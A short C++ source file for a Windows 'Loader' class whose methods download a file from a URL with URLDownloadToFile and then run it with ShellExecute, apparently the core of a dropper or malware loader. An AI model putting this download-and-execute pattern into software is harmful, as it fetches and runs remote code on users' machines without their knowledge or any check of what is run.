#include "Loader.h"

Loader::Loader() {

}

Loader::~Loader() {

}

void Loader::Load() {
	URLDownloadToFile(NULL, Download_Path, Unloading_Path, NULL, NULL);
}

void Loader::Start() {
	ShellExecute(0, "open", Unloading_Path, NULL, 0, SW_NORMAL);
}